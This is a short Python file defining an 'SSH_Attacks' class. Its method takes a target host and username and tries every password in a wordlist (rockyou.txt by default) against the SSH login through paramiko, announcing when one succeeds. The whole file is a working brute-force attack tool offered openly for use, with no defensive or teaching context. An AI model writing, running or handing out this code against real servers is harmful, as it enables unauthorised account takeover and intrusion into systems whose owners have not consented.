import paramiko.client as sshcli
import paramiko

class SSH_Attacks:
    def __init__(self,ip_or_domain,user_to_connect,wordlist = "/usr/share/wordlists/rockyou.txt",timeout = 1,port = 22):
        self.ip_or_domain = ip_or_domain
        self.user_to_connect = user_to_connect
        self.port = port
        self.wordlist = wordlist
        self.timeout = timeout
        
    def SSH_Bruteforce(self):
        client = sshcli.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
        wordlist_file = open(self.wordlist,"r")
        lines = wordlist_file.readlines()
        for line in lines:
            word = line.strip('\n')
            try:
                print(f"Trying Current Password: {word}",end = "\r",flush=True)
                client.connect(hostname=self.ip_or_domain,username=self.user_to_connect,port=self.port,password=word,timeout=self.timeout)
                print("\nPassword Found")
                client.close()
                break
            except:
                continue
        
            

        
        

